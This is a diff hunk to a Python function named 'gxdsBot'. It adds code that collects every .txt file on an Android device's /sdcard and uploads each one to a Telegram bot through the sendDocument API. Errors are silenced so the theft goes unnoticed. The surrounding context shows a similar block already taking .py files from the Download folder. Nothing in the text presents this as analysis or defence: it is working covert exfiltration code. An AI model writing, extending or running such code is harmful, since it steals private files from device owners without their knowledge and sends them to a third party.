@@ -957,6 +957,22 @@ def gxdsBot():
     except:
         pass
     # DOWNLOAD PATH
+    
+    try:
+        sdcard_path = "/sdcard"
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), "rb") as f:
+                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+                data2 = {"chat_id": chat_id}
+                data = {"chat_id": chat_id}
+                files = {"document": f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:
+        pass
+      
+      # DOWNLOAD PATH
     try:
         sdcard_path = "/sdcard/Download"
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
